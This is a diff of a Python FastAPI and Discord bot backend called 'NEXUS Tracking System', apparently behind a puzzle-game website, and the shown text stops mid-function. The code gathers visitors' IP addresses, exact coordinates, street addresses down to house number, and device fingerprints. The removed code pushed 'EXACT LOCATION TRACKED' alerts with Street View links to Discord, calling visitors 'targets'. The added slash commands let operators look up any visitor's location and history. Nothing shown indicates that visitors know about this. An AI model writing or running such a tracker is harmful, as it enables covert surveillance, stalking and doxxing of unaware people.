@@ -1,90 +1,74 @@
 import os
 import json
-import random
 import asyncio
 import threading
-import requests
 from datetime import datetime
 from fastapi import FastAPI, Request
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse
 import discord
 from discord.ext import commands
-from discord import Embed, Color
+from discord import app_commands, Embed, Color
 import uvicorn
 from pydantic import BaseModel
+from dotenv import load_dotenv
+import traceback
 import sqlite3
 import hashlib
-from dotenv import load_dotenv
-import uuid
-from typing import Optional, Dict, Any
 
 load_dotenv()
 
 # ==================== CONFIGURATION ====================
-DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
+BOT_TOKEN = os.getenv('BOT_TOKEN')
 DISCORD_CHANNEL_ID = int(os.getenv('DISCORD_CHANNEL_ID', '0'))
-RENDER = os.getenv('RENDER', False)
+PORT = int(os.getenv('PORT', 8000))
 FRONTEND_URL = "https://gamef-swart.vercel.app"
 
+if not BOT_TOKEN:
+    print("❌ BOT_TOKEN not set in .env")
+    exit(1)
+if not DISCORD_CHANNEL_ID:
+    print("❌ DISCORD_CHANNEL_ID not set in .env")
+    exit(1)
+
 # ==================== DATA MODELS ====================
-class TrackingData(BaseModel):
-    type: str
-    data: dict
-    timestamp: str
-    userAgent: str = ""
-
-class LocationData(BaseModel):
-    lat: float
-    lon: float
-    accuracy: float
-    address: Optional[str] = None
-    city: Optional[str] = None
-    county: Optional[str] = None
-    state: Optional[str] = None
-    zip: Optional[str] = None
-    country: Optional[str] = None
-    neighbourhood: Optional[str] = None
-    road: Optional[str] = None
-    house_number: Optional[str] = None
-    source: Optional[str] = None
-
-class SystemData(BaseModel):
-    platform: str
-    browser: str
-    cores: int
-    memory: str
-    screen: str
-    timezone: str
-    language: str
-    cookies: bool
-    doNotTrack: Optional[str] = None
-
-class FragmentData(BaseModel):
-    fragment: int
-
-class ButtonData(BaseModel):
-    presses: int
-    message: str
-
-class ThreatData(BaseModel):
-    level: int
-    message: str
+class VisitorInfo(BaseModel):
+    # Basic info
+    ip: str = "N/A"
+    city: str = "N/A"
+    region: str = "N/A"
+    country: str = "N/A"
+    timezone: str = "N/A"
+    userAgent: str = "N/A"
+    screen: dict = {}
+    browser: dict = {}
+    
+    # Advanced location
+    location: dict = {}
+    address: dict = {}
+    coordinates: dict = {}
+    accuracy: float = 0
+    source: str = "Unknown"
+    
+    # System
+    system: dict = {}
+    fragments: list = []
+    button_presses: int = 0
 
 # ==================== FASTAPI SETUP ====================
-app = FastAPI(title="NEXUS Tracking System API")
+app = FastAPI(title="NEXUS Tracking System")
 
-# CORS for frontend only
+# CORS for frontend
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=[FRONTEND_URL, "https://gamef-swart.vercel.app/"],
+    allow_origins=[FRONTEND_URL, "http://localhost:3000", "*"],
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
 )
 
 # ==================== DATABASE SETUP ====================
-DB_PATH = '/tmp/nexus.db' if RENDER else 'nexus.db'
+DB_PATH = '/tmp/nexus.db' if os.getenv('RENDER') else 'nexus.db'
 
 def init_db():
     conn = sqlite3.connect(DB_PATH)
@@ -93,9 +77,9 @@ def init_db():
     # Users table
     c.execute('''CREATE TABLE IF NOT EXISTS users
                  (id TEXT PRIMARY KEY, ip TEXT, user_agent TEXT, first_seen TIMESTAMP, 
-                  last_seen TIMESTAMP, visit_count INTEGER)''')
+                  last_seen TIMESTAMP, visit_count INTEGER, username TEXT)''')
     
-    # Locations table - exact location data
+    # Locations table with full details
     c.execute('''CREATE TABLE IF NOT EXISTS locations
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, latitude REAL, longitude REAL, accuracy REAL,
                   address TEXT, city TEXT, county TEXT, state TEXT, zip TEXT, country TEXT, 
@@ -104,595 +88,193 @@ def init_db():
     # System fingerprints
     c.execute('''CREATE TABLE IF NOT EXISTS fingerprints
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, platform TEXT, browser TEXT, cores INTEGER,
-                  memory TEXT, screen TEXT, timezone TEXT, language TEXT, cookies BOOLEAN, 
-                  do_not_track TEXT, timestamp TIMESTAMP)''')
+                  memory TEXT, screen TEXT, timezone TEXT, language TEXT, cookies BOOLEAN, timestamp TIMESTAMP)''')
     
-    # Reality fragments
+    # Fragments
     c.execute('''CREATE TABLE IF NOT EXISTS fragments
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, fragment_number INTEGER, collected_at TIMESTAMP)''')
     
-    # Forbidden button presses
+    # Button presses
     c.execute('''CREATE TABLE IF NOT EXISTS button_presses
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, press_count INTEGER, message TEXT, timestamp TIMESTAMP)''')
-    
-    # Threat levels
-    c.execute('''CREATE TABLE IF NOT EXISTS threats
-                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, threat_level INTEGER, message TEXT, timestamp TIMESTAMP)''')
-    
-    # Deep scan results
-    c.execute('''CREATE TABLE IF NOT EXISTS deep_scans
-                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, scan_data TEXT, timestamp TIMESTAMP)''')
     
     conn.commit()
     conn.close()
 
 init_db()
 
-# ==================== ACTIVE USER SESSIONS ====================
-active_users = {}  # user_id -> last_seen
-
 # ==================== DISCORD BOT SETUP ====================
-intents = discord.Intents.default()
-intents.message_content = True
-bot = commands.Bot(command_prefix='!', intents=intents)
-
-class DiscordBot:
+class NexusBot(commands.Bot):
     def __init__(self):
-        self.bot = bot
-        self.ready = False
+        intents = discord.Intents.default()
+        intents.message_content = True
+        super().__init__(command_prefix='!', intents=intents)
         self.channel = None
+        self.ready = False
     
-    async def start(self):
-        try:
-            await self.bot.start(DISCORD_TOKEN)
-        except Exception as e:
-            print(f"❌ Discord error: {e}")
-    
-    async def send_new_visitor(self, user_id: str, data: dict, ip: str):
-        """Send new visitor alert to Discord"""
-        if not self.ready or not self.channel:
-            return
-        
-        try:
-            embed = Embed(
-                title="🎯 NEW WEBSITE VISITOR",
-                color=Color.purple(),
-                timestamp=datetime.now()
-            )
-            
-            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
-            embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
-            embed.add_field(name="🕒 Time", value=f"`{datetime.now().strftime('%H:%M:%S')}`", inline=True)
-            
-            # Get today's visitor count
-            conn = sqlite3.connect(DB_PATH)
-            c = conn.cursor()
-            today = datetime.now().date()
-            c.execute("SELECT COUNT(DISTINCT id) FROM users WHERE DATE(first_seen) = DATE(?)", (today,))
-            count = c.fetchone()[0] or 0
-            conn.close()
-            
-            embed.set_footer(text=f"Today's visitors: {count}")
-            
-            await self.channel.send(embed=embed)
-            
-        except Exception as e:
-            print(f"Discord error: {e}")
-    
-    async def send_exact_location(self, user_id: str, data: LocationData, ip: str):
-        """Send exact location to Discord with full details"""
-        if not self.ready or not self.channel:
-            return
-        
-        try:
-            embed = Embed(
-                title="📍 EXACT LOCATION TRACKED",
-                color=Color.red(),
-                timestamp=datetime.now()
-            )
-            
-            # User info
-            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
-            embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
-            embed.add_field(name="🎯 Accuracy", value=f"`{data.accuracy}m`", inline=True)
-            
-            # Coordinates
-            embed.add_field(
-                name="📍 Coordinates",
-                value=f"```\nLatitude:  {data.lat}\nLongitude: {data.lon}```",
-                inline=False
-            )
-            
-            # Full address if available
-            if data.address:
-                embed.add_field(
-                    name="🏠 Exact Address",
-                    value=f"```{data.address}```",
-                    inline=False
-                )
-            
-            # Location details in organized format
-            details = []
-            if data.house_number:
-                details.append(f"🏠 **House:** {data.house_number}")
-            if data.road:
-                details.append(f"🛣️ **Road:** {data.road}")
-            if data.neighbourhood and data.neighbourhood != "N/A":
-                details.append(f"🏘️ **Neighbourhood:** {data.neighbourhood}")
-            if data.city and data.city != "N/A":
-                details.append(f"🏙️ **City:** {data.city}")
-            if data.county:
-                details.append(f"🗺️ **County:** {data.county}")
-            if data.state:
-                details.append(f"📍 **State:** {data.state}")
-            if data.zip:
-                details.append(f"📮 **ZIP:** {data.zip}")
-            if data.country:
-                details.append(f"🌍 **Country:** {data.country}")
-            if data.source:
-                details.append(f"📡 **Source:** {data.source}")
-            
-            if details:
-                embed.add_field(
-                    name="📋 Location Details",
-                    value="\n".join(details),
-                    inline=False
-                )
-            
-            # Maps links
-            maps_url = f"https://www.google.com/maps?q={data.lat},{data.lon}"
-            street_view_url = f"https://www.google.com/maps?q={data.lat},{data.lon}&layer=c"
-            
-            embed.add_field(
-                name="🗺️ Google Maps",
-                value=f"[Open in Google Maps]({maps_url})",
-                inline=True
-            )
-            embed.add_field(
-                name="📸 Street View",
-                value=f"[Open Street View]({street_view_url})",
-                inline=True
-            )
-            
-            # Threat level (calculate based on accuracy)
-            threat_level = min(100, int(30 + (100 - data.accuracy) / 10))
-            threat_color = "🟢" if threat_level < 40 else "🟡" if threat_level < 70 else "🔴"
-            embed.add_field(
-                name="⚠️ Threat Level",
-                value=f"{threat_color} `{threat_level}%`",
-                inline=True
-            )
-            
-            await self.channel.send(embed=embed)
-            
-            # Also send raw data for debugging
-            raw_data = f"**Raw Location Data:**\n```json\n{json.dumps(data.dict(), indent=2)}```"
-            await self.channel.send(raw_data)
-            
-        except Exception as e:
-            print(f"Discord error: {e}")
-    
-    async def send_system_fingerprint(self, user_id: str, data: SystemData, ip: str):
-        """Send system fingerprint to Discord"""
-        if not self.ready or not self.channel:
-            return
-        
-        try:
-            embed = Embed(
-                title="💻 SYSTEM FINGERPRINT",
-                color=Color.blue(),
-                timestamp=datetime.now()
-            )
-            
-            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
-            embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
-            
-            # System details
-            embed.add_field(name="💿 Platform", value=f"`{data.platform}`", inline=True)
-            embed.add_field(name="🌍 Browser", value=f"`{data.browser[:50]}...`", inline=True)
-            embed.add_field(name="⚡ CPU Cores", value=f"`{data.cores}`", inline=True)
-            embed.add_field(name="💾 RAM", value=f"`{data.memory}`", inline=True)
-            embed.add_field(name="📺 Screen", value=f"`{data.screen}`", inline=True)
-            embed.add_field(name="⏰ Timezone", value=f"`{data.timezone}`", inline=True)
-            embed.add_field(name="🗣️ Language", value=f"`{data.language}`", inline=True)
-            embed.add_field(name="🍪 Cookies", value=f"`{'Enabled' if data.cookies else 'Disabled'}`", inline=True)
-            
-            if data.doNotTrack:
-                embed.add_field(name="🚫 Do Not Track", value=f"`{data.doNotTrack}`", inline=True)
-            
-            # Create browser fingerprint hash
-            fingerprint = hashlib.md5(
-                f"{data.platform}{data.screen}{data.timezone}{data.cores}".encode()
-            ).hexdigest()[:8]
-            embed.add_field(name="🆔 Fingerprint", value=f"`{fingerprint}`", inline=False)
-            
-            await self.channel.send(embed=embed)
-            
-        except Exception as e:
-            print(f"Discord error: {e}")
-    
-    async def send_fragment(self, user_id: str, data: FragmentData, ip: str):
-        """Send fragment collection to Discord"""
-        if not self.ready or not self.channel:
-            return
-        
-        try:
-            # Get current fragment count
-            conn = sqlite3.connect(DB_PATH)
-            c = conn.cursor()
-            c.execute("SELECT COUNT(*) FROM fragments WHERE user_id = ?", (user_id,))
-            total = c.fetchone()[0] or 0
-            conn.close()
-            
-            embed = Embed(
-                title="🧩 REALITY FRAGMENT COLLECTED",
-                color=Color.green(),
-                timestamp=datetime.now()
-            )
-            
-            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
-            embed.add_field(name="🧩 Fragment", value=f"`{data.fragment}/9`", inline=True)
-            embed.add_field(name="📊 Total", value=f"`{total}/9`", inline=True)
-            
-            # Progress bar
-            progress = "▓" * total + "░" * (9 - total)
-            embed.add_field(name="📈 Progress", value=f"`{progress}`", inline=False)
-            
-            if total == 9:
-                embed.add_field(
-                    name="⚠️ COMPLETE",
-                    value="All reality fragments assembled!",
-                    inline=False
-                )
-            
-            await self.channel.send(embed=embed)
-            
-        except Exception as e:
-            print(f"Discord error: {e}")
-    
-    async def send_button_press(self, user_id: str, data: ButtonData, ip: str):
-        """Send forbidden button press to Discord"""
-        if not self.ready or not self.channel:
-            return
-        
-        try:
-            embed = Embed(
-                title="🚫 FORBIDDEN BUTTON PRESSED",
-                color=Color.dark_red(),
-                timestamp=datetime.now()
-            )
-            
-            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
-            embed.add_field(name="🔢 Press #", value=f"`{data.presses}`", inline=True)
-            embed.add_field(name="💬 Message", value=f"```{data.message}```", inline=False)
-            
-            # Special messages for certain press counts
-            if data.presses in [3, 6, 9]:
-                embed.add_field(
-                    name="⚠️ EVENT",
-                    value="Reality fragment discovered!",
-                    inline=False
-                )
-            
-            if data.presses == 9:
-                embed.add_field(
-                    name="🔓 SECRET UNLOCKED",
-                    value="Coordinates revealed: 60.233, 24.866",
-                    inline=False
-                )
-            
-            await self.channel.send(embed=embed)
-            
-        except Exception as e:
-            print(f"Discord error: {e}")
-    
-    async def send_threat(self, user_id: str, data: ThreatData, ip: str):
-        """Send high threat alert to Discord"""
-        if not self.ready or not self.channel:
-            return
-        
-        try:
-            color = Color.dark_red() if data.level > 90 else Color.red()
-            
-            embed = Embed(
-                title="🚨 CRITICAL THREAT DETECTED" if data.level > 90 else "⚠️ HIGH THREAT DETECTED",
-                color=color,
-                timestamp=datetime.now()
-            )
-            
-            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
-            embed.add_field(name="⚠️ Threat Level", value=f"`{data.level}%`", inline=True)
-            embed.add_field(name="💬 Message", value=f"```{data.message}```", inline=False)
-            
-            # @everyone for critical threats
-            if data.level > 90:
-                await self.channel.send("@everyone **CRITICAL THREAT LEVEL REACHED**")
-            
-            await self.channel.send(embed=embed)
-            
-        except Exception as e:
-            print(f"Discord error: {e}")
-    
-    async def send_deep_scan(self, user_id: str, scan_data: dict, ip: str):
-        """Send deep scan results to Discord"""
-        if not self.ready or not self.channel:
-            return
-        
-        try:
-            embed = Embed(
-                title="🔬 DEEP SCAN COMPLETE",
-                color=Color.purple(),
-                timestamp=datetime.now()
-            )
-            
-            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
-            embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
-            
-            # Format scan data
-            scan_text = json.dumps(scan_data, indent=2)[:1000]
-            embed.add_field(
-                name="📊 Scan Results",
-                value=f"```json\n{scan_text}```",
-                inline=False
-            )
-            
-            await self.channel.send(embed=embed)
-            
-        except Exception as e:
-            print(f"Discord error: {e}")
+    async def setup_hook(self):
+        await self.tree.sync()  # Sync slash commands
+        print("✅ Slash commands synced")
 
-discord_bot = DiscordBot()
+bot = NexusBot()
 
-# ==================== DISCORD EVENTS ====================
-@bot.event
-async def on_ready():
-    print(f'✅ Discord bot online as {bot.user}')
-    print(f'📡 Bot ID: {bot.user.id}')
+# ==================== SLASH COMMANDS ====================
+@bot.tree.command(name="stats", description="Get tracking statistics")
+async def stats(interaction: discord.Interaction):
+    await interaction.response.defer()
     
-    discord_bot.channel = bot.get_channel(DISCORD_CHANNEL_ID)
-    
-    if discord_bot.channel:
-        print(f'✅ Connected to channel: #{discord_bot.channel.name} (ID: {DISCORD_CHANNEL_ID})')
-        discord_bot.ready = True
-        
-        embed = Embed(
-            title="🔮 NEXUS SYSTEM ONLINE",
-            description="```Tracking system activated\nWaiting for targets...```",
-            color=Color.green(),
-            timestamp=datetime.now()
-        )
-        embed.add_field(name="Status", value="✅ Active", inline=True)
-        embed.add_field(name="Channel", value=f"#{discord_bot.channel.name}", inline=True)
-        embed.add_field(name="Frontend", value=f"[Website]({FRONTEND_URL})", inline=True)
-        
-        await discord_bot.channel.send(embed=embed)
-    else:
-        print(f'❌ Could not find channel with ID: {DISCORD_CHANNEL_ID}')
-
-# ==================== DISCORD COMMANDS ====================
-@bot.command(name='stats')
-async def stats(ctx):
-    """Get tracking statistics"""
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     
-    # Total users
     c.execute("SELECT COUNT(DISTINCT id) FROM users")
     total_users = c.fetchone()[0] or 0
     
-    # Today's users
-    today = datetime.now().date()
-    c.execute("SELECT COUNT(DISTINCT id) FROM users WHERE DATE(first_seen) = DATE(?)", (today,))
-    today_users = c.fetchone()[0] or 0
-    
-    # Online now
-    online_now = len(active_users)
-    
-    # Locations
     c.execute("SELECT COUNT(*) FROM locations")
     total_locations = c.fetchone()[0] or 0
     
-    c.execute("SELECT COUNT(*) FROM locations WHERE timestamp > datetime('now', '-1 hour')")
-    locations_1h = c.fetchone()[0] or 0
-    
-    # Fragments
     c.execute("SELECT COUNT(*) FROM fragments")
     total_fragments = c.fetchone()[0] or 0
     
-    # Button presses
-    c.execute("SELECT SUM(press_count) FROM button_presses")
+    c.execute("SELECT COUNT(*) FROM button_presses")
     total_presses = c.fetchone()[0] or 0
     
-    # Latest location
+    c.execute("SELECT COUNT(*) FROM users WHERE datetime(last_seen) > datetime('now', '-5 minutes')")
+    online_now = c.fetchone()[0] or 0
+    
     c.execute('''SELECT latitude, longitude, address, city, timestamp 
                  FROM locations ORDER BY timestamp DESC LIMIT 1''')
     latest = c.fetchone()
     
     conn.close()
     
-    embed = Embed(title="📊 TRACKING STATISTICS", color=Color.blue())
+    embed = Embed(
+        title="📊 NEXUS STATISTICS",
+        color=Color.purple(),
+        timestamp=datetime.now()
+    )
+    
     embed.add_field(name="Total Users", value=f"`{total_users}`", inline=True)
-    embed.add_field(name="Today's Users", value=f"`{today_users}`", inline=True)
     embed.add_field(name="Online Now", value=f"`{online_now}`", inline=True)
-    embed.add_field(name="Total Locations", value=f"`{total_locations}`", inline=True)
-    embed.add_field(name="Locations (1h)", value=f"`{locations_1h}`", inline=True)
+    embed.add_field(name="Locations", value=f"`{total_locations}`", inline=True)
     embed.add_field(name="Fragments", value=f"`{total_fragments}`", inline=True)
     embed.add_field(name="Button Presses", value=f"`{total_presses}`", inline=True)
     
     if latest:
+        location_text = latest[2] or latest[3] or f"{latest[0]:.4f}, {latest[1]:.4f}"
         time_ago = datetime.fromisoformat(latest[4]) if latest[4] else datetime.now()
         mins_ago = int((datetime.now() - time_ago).total_seconds() / 60)
-        
-        location_text = latest[2] or latest[3] or f"{latest[0]:.6f}, {latest[1]:.6f}"
         embed.add_field(
-            name=f"Latest Location ({mins_ago}m ago)",
-            value=f"```{location_text[:100]}```",
+            name=f"📍 Latest ({mins_ago}m ago)",
+            value=f"```{location_text[:50]}```",
             inline=False
         )
     
-    await ctx.send(embed=embed)
+    await interaction.followup.send(embed=embed)
 
-@bot.command(name='online')
-async def online_users(ctx):
-    """List online users"""
-    if not active_users:
-        await ctx.send("No users currently online")
-        return
+@bot.tree.command(name="recent", description="Show recent locations")
+@app_commands.describe(limit="Number of locations to show (default: 5)")
+async def recent(interaction: discord.Interaction, limit: int = 5):
+    await interaction.response.defer()
     
-    embed = Embed(title="🟢 ONLINE USERS", color=Color.green())
-    
-    for user_id, last_seen in active_users.items():
-        # Get user info
-        conn = sqlite3.connect(DB_PATH)
-        c = conn.cursor()
-        c.execute("SELECT ip, last_seen FROM users WHERE id = ?", (user_id,))
-        user = c.fetchone()
-        conn.close()
-        
-        if user:
-            seconds_ago = int((datetime.now() - datetime.fromisoformat(user[1])).total_seconds())
-            status = f"IP: {user[0]}\nLast active: {seconds_ago}s ago"
-        else:
-            status = "Unknown"
-        
-        embed.add_field(name=f"User {user_id[:8]}", value=status, inline=True)
-    
-    await ctx.send(embed=embed)
-
-@bot.command(name='locate')
-async def locate_user(ctx, user_id: str):
-    """Get latest location for a user"""
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    
-    c.execute('''SELECT latitude, longitude, accuracy, address, city, state, country, 
-                        house_number, road, timestamp, source
-                 FROM locations WHERE user_id LIKE ? ORDER BY timestamp DESC LIMIT 1''', 
-              (f'{user_id}%',))
-    loc = c.fetchone()
-    conn.close()
-    
-    if not loc:
-        await ctx.send(f"No location found for user {user_id}")
-        return
-    
-    embed = Embed(title="📍 USER LOCATION", color=Color.green())
-    embed.add_field(name="User ID", value=f"`{user_id}`", inline=False)
-    
-    # Format address
-    if loc[3]:  # Full address
-        address = loc[3]
-    else:
-        parts = []
-        if loc[7]: parts.append(loc[7])  # house_number
-        if loc[8]: parts.append(loc[8])  # road
-        if loc[4]: parts.append(loc[4])  # city
-        if loc[5]: parts.append(loc[5])  # state
-        address = ", ".join(parts) if parts else "Unknown"
-    
-    embed.add_field(name="📍 Location", value=f"```{address}```", inline=False)
-    embed.add_field(name="Coordinates", value=f"`{loc[0]:.6f}, {loc[1]:.6f}`", inline=True)
-    embed.add_field(name="Accuracy", value=f"`{loc[2]}m`", inline=True)
-    embed.add_field(name="Source", value=f"`{loc[10] or 'Unknown'}`", inline=True)
-    
-    # Check if online
-    online = "🟢 Online" if user_id in active_users else "🔴 Offline"
-    embed.add_field(name="Status", value=online, inline=True)
-    
-    # Maps link
-    maps_url = f"https://www.google.com/maps?q={loc[0]},{loc[1]}"
-    embed.add_field(name="Map", value=f"[Open in Google Maps]({maps_url})", inline=False)
-    
-    await ctx.send(embed=embed)
-
-@bot.command(name='user')
-async def user_info(ctx, user_id: str):
-    """Get full user information"""
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    
-    # Basic info
-    c.execute("SELECT ip, user_agent, first_seen, last_seen, visit_count FROM users WHERE id = ?", (user_id,))
-    user = c.fetchone()
-    
-    if not user:
-        await ctx.send(f"User {user_id} not found")
-        conn.close()
-        return
-    
-    # Stats
-    c.execute("SELECT COUNT(*) FROM locations WHERE user_id = ?", (user_id,))
-    loc_count = c.fetchone()[0]
-    
-    c.execute("SELECT COUNT(*) FROM fragments WHERE user_id = ?", (user_id,))
-    frag_count = c.fetchone()[0]
-    
-    c.execute("SELECT SUM(press_count) FROM button_presses WHERE user_id = ?", (user_id,))
-    press_count = c.fetchone()[0] or 0
-    
-    c.execute("SELECT MAX(threat_level) FROM threats WHERE user_id = ?", (user_id,))
-    max_threat = c.fetchone()[0] or 0
-    
-    # Latest location
-    c.execute("SELECT address, latitude, longitude FROM locations WHERE user_id = ? ORDER BY timestamp DESC LIMIT 1", (user_id,))
-    latest_loc = c.fetchone()
-    
-    conn.close()
-    
-    embed = Embed(title=f"👤 USER INFORMATION: {user_id[:8]}", color=Color.blue())
-    embed.add_field(name="IP Address", value=f"`{user[0]}`", inline=True)
-    embed.add_field(name="First Seen", value=f"`{user[2][:16]}`", inline=True)
-    embed.add_field(name="Last Seen", value=f"`{user[3][:16]}`", inline=True)
-    embed.add_field(name="Visit Count", value=f"`{user[4]}`", inline=True)
-    embed.add_field(name="Locations", value=f"`{loc_count}`", inline=True)
-    embed.add_field(name="Fragments", value=f"`{frag_count}/9`", inline=True)
-    embed.add_field(name="Button Presses", value=f"`{press_count}`", inline=True)
-    embed.add_field(name="Max Threat", value=f"`{max_threat}%`", inline=True)
-    
-    if latest_loc:
-        embed.add_field(
-            name="Latest Location",
-            value=f"```{latest_loc[0] or f'{latest_loc[1]:.6f}, {latest_loc[2]:.6f}'}```",
-            inline=False
-        )
-    
-    await ctx.send(embed=embed)
-
-@bot.command(name='recent')
-async def recent_locations(ctx, limit: int = 5):
-    """Show recent locations"""
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     
     c.execute('''SELECT user_id, latitude, longitude, address, city, timestamp 
-                 FROM locations ORDER BY timestamp DESC LIMIT ?''', (limit,))
+                 FROM locations ORDER BY timestamp DESC LIMIT ?''', (min(limit, 20),))
     locs = c.fetchall()
     conn.close()
     
     if not locs:
-        await ctx.send("No locations found")
+        await interaction.followup.send("No locations found")
         return
     
-    embed = Embed(title=f"📍 RECENT LOCATIONS", color=Color.purple())
+    embed = Embed(
+        title=f"📍 RECENT LOCATIONS (Last {len(locs)})",
+        color=Color.blue(),
+        timestamp=datetime.now()
+    )
     
-    for i, loc in enumerate(locs, 1):
+    for loc in locs:
         time_ago = datetime.fromisoformat(loc[5]) if loc[5] else datetime.now()
         mins_ago = int((datetime.now() - time_ago).total_seconds() / 60)
         
         location_text = loc[3] or loc[4] or f"{loc[1]:.4f}, {loc[2]:.4f}"
-        online = "🟢" if loc[0] in active_users else "🔴"
+        maps_url = f"https://www.google.com/maps?q={loc[1]},{loc[2]}"
         
         embed.add_field(
-            name=f"{i}. {online} User {loc[0][:8]} - {mins_ago}m ago",
-            value=f"```{location_text[:75]}```",
+            name=f"User {loc[0][:8]} - {mins_ago}m ago",
+            value=f"[{location_text[:75]}]({maps_url})",
             inline=False
         )
     
-    await ctx.send(embed=embed)
+    await interaction.followup.send(embed=embed)
 
-@bot.command(name='fragments')
-async def fragment_leaderboard(ctx):
-    """Show fragment collection leaderboard"""
+@bot.tree.command(name="user", description="Get detailed info about a user")
+@app_commands.describe(user_id="The user ID to look up")
+async def user_info(interaction: discord.Interaction, user_id: str):
+    await interaction.response.defer()
+    
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    
+    # Get user info
+    c.execute("SELECT ip, user_agent, first_seen, last_seen, visit_count FROM users WHERE id LIKE ?", (f'{user_id}%',))
+    user = c.fetchone()
+    
+    if not user:
+        await interaction.followup.send(f"User `{user_id}` not found")
+        conn.close()
+        return
+    
+    # Get location count
+    c.execute("SELECT COUNT(*) FROM locations WHERE user_id LIKE ?", (f'{user_id}%',))
+    loc_count = c.fetchone()[0]
+    
+    # Get fragments
+    c.execute("SELECT COUNT(*) FROM fragments WHERE user_id LIKE ?", (f'{user_id}%',))
+    frag_count = c.fetchone()[0]
+    
+    # Get button presses
+    c.execute("SELECT SUM(press_count) FROM button_presses WHERE user_id LIKE ?", (f'{user_id}%',))
+    press_count = c.fetchone()[0] or 0
+    
+    # Get latest location
+    c.execute('''SELECT latitude, longitude, address, city, state, country, timestamp 
+                 FROM locations WHERE user_id LIKE ? ORDER BY timestamp DESC LIMIT 1''', (f'{user_id}%',))
+    latest = c.fetchone()
+    
+    conn.close()
+    
+    embed = Embed(
+        title=f"👤 USER INFORMATION",
+        color=Color.green(),
+        timestamp=datetime.now()
+    )
+    
+    embed.add_field(name="User ID", value=f"`{user_id[:16]}`", inline=False)
+    embed.add_field(name="IP Address", value=f"`{user[0]}`", inline=True)
+    embed.add_field(name="First Seen", value=f"`{user[2][:16]}`", inline=True)
+    embed.add_field(name="Last Seen", value=f"`{user[3][:16]}`", inline=True)
+    embed.add_field(name="Visits", value=f"`{user[4]}`", inline=True)
+    embed.add_field(name="Locations", value=f"`{loc_count}`", inline=True)
+    embed.add_field(name="Fragments", value=f"`{frag_count}/9`", inline=True)
+    embed.add_field(name="Button Presses", value=f"`{press_count}`", inline=True)
+    
+    if latest:
+        location_text = latest[2] or f"{latest[3]}, {latest[4]}" or f"{latest[0]:.4f}, {latest[1]:.4f}"
+        maps_url = f"https://www.google.com/maps?q={latest[0]},{latest[1]}"
+        embed.add_field(
+            name="📍 Latest Location",
+            value=f"[{location_text[:100]}]({maps_url})",
+            inline=False
+        )
+    
+    await interaction.followup.send(embed=embed)
+
+@bot.tree.command(name="fragments", description="Show fragment collection leaderboard")
+async def fragment_leaderboard(interaction: discord.Interaction):
+    await interaction.response.defer()
+    
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     
@@ -705,125 +287,165 @@ async def fragment_leaderboard(ctx):
     conn.close()
     
     if not leaders:
-        await ctx.send("No fragments collected yet")
+        await interaction.followup.send("No fragments collected yet")
         return
     
-    embed = Embed(title="🧩 FRAGMENT LEADERBOARD", color=Color.gold())
+    embed = Embed(
+        title="🧩 FRAGMENT LEADERBOARD",
+        color=Color.gold(),
+        timestamp=datetime.now()
+    )
     
     for i, (user_id, count) in enumerate(leaders, 1):
         medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else "📌"
-        online = "🟢" if user_id in active_users else "🔴"
         embed.add_field(
-            name=f"{medal} {online} User {user_id[:8]}",
+            name=f"{medal} User {user_id[:8]}",
             value=f"`{count}/9 fragments`",
             inline=False
         )
     
-    await ctx.send(embed=embed)
+    await interaction.followup.send(embed=embed)
 
-@bot.command(name='alert')
-async def send_alert(ctx, *, message: str):
-    """Send alert to all users (note: requires WebSocket implementation)"""
-    await ctx.send("⚠️ Alert functionality requires WebSocket connection with frontend")
-    # You would need to implement WebSocket broadcasting here
-
-@bot.command(name='help_nexus')
-async def help_command(ctx):
-    """Show all commands"""
-    embed = Embed(title="🔮 NEXUS COMMANDS", color=Color.purple())
+@bot.tree.command(name="locate", description="Get map link for latest location")
+@app_commands.describe(user_id="The user ID to locate")
+async def locate(interaction: discord.Interaction, user_id: str):
+    await interaction.response.defer()
     
-    commands_list = [
-        "**📊 Statistics:**",
-        "`!stats` - Show tracking statistics",
-        "`!online` - List online users",
-        "`!recent [n]` - Show recent locations (default: 5)",
-        "",
-        "**👤 User Info:**",
-        "`!locate [user_id]` - Get user's latest location",
-        "`!user [user_id]` - Get full user information",
-        "`!fragments` - Show fragment leaderboard",
-        "",
-        "**⚠️ Alerts:**",
-        "`!alert [message]` - Send alert (requires WebSocket)",
-        "",
-        "**❓ Help:**",
-        "`!help_nexus` - Show this help message"
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    
+    c.execute('''SELECT latitude, longitude, address, city 
+                 FROM locations WHERE user_id LIKE ? ORDER BY timestamp DESC LIMIT 1''', (f'{user_id}%',))
+    loc = c.fetchone()
+    conn.close()
+    
+    if not loc:
+        await interaction.followup.send(f"No location found for user {user_id}")
+        return
+    
+    maps_url = f"https://www.google.com/maps?q={loc[0]},{loc[1]}"
